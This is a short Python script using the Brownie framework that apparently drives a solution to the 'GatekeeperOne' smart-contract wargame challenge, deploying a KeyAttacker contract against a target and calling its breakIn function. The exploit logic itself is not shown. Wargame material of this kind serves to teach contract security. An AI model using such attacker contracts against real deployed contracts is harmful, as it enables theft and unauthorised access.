#!/usr/bin/python3
from brownie import GatekeeperOne, KeyAttacker
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def forceEntry(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        contract_address = target.address
        _, attacker = get_account()
    else:
        target = GatekeeperOne.at(contract_address)

    attacker_contract = KeyAttacker.deploy(target, {"from": attacker})
    tx = attacker_contract.breakIn({"from": attacker})
    # assert len(tx.events) > 0
    print(tx.events)


def main(contract_address=None):
    if contract_address:
        forceEntry(contract_address, get_account())
    else:
        forceEntry()


if __name__ == "__main__":
    main()
